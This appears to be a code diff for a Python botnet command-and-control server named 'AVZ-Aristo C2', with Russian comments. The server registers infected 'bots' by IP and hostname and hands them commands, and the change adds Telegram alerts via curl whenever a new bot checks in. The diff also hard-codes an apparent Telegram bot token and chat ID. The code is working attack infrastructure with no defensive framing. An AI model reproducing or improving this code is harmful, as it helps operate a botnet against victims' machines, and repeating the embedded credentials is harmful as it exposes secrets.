@@ -1,11 +1,26 @@
 #!/usr/bin/env python3
-# AVZ-Aristo C2 – сверхминимальный, без внешних зависимостей
-import asyncio, json, os, time
+# AVZ-Aristo C2 – уведомления в Telegram через curl
+import asyncio, json, os, time, subprocess
 from datetime import datetime
 
 HTTP_PORT = 80
 BOTS_FILE = "bots.json"
 COMMANDS_FILE = "commands.json"
+
+TELEGRAM_TOKEN = "8801568177:AAG8KfuLv79gJ0VEhL85QwmOB4OL9R1KNto"
+TELEGRAM_CHAT_ID = "2119367196"
+
+def telegram_notify(msg):
+    if not (TELEGRAM_TOKEN and TELEGRAM_CHAT_ID):
+        return
+    try:
+        subprocess.run([
+            "curl", "-s", "-X", "POST",
+            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+            "-d", f"chat_id={TELEGRAM_CHAT_ID}&text={msg}"
+        ], timeout=5)
+    except:
+        pass
 
 bots = {}
 if os.path.exists(BOTS_FILE):
@@ -79,7 +94,6 @@ async def handle_client(reader, writer):
             bots[ip]["status"] = "online"
             save_bots()
     else:
-        # Регистрация нового бота
         info = {}
         try:
             data = json.loads(msg)
@@ -106,15 +120,14 @@ async def handle_client(reader, writer):
         }
         save_bots()
         if is_new:
-            # Можно добавить уведомление в Telegram, но сейчас для простоты пропущено
-            pass
+            telegram_notify(f"🟢 Новый бот: {ip} ({hostname})")
         writer.write(b"registered")
     await writer.drain()
     writer.close()
 
 async def main():
     server = await asyncio.start_server(handle_client, '0.0.0.0', HTTP_PORT)
-    print(f"[+] C2 (чистый asyncio) слушает порт {HTTP_PORT}")
+    print(f"[+] C2 (уведомления через curl) на порту {HTTP_PORT}")
     async with server:
         await server.serve_forever()
 
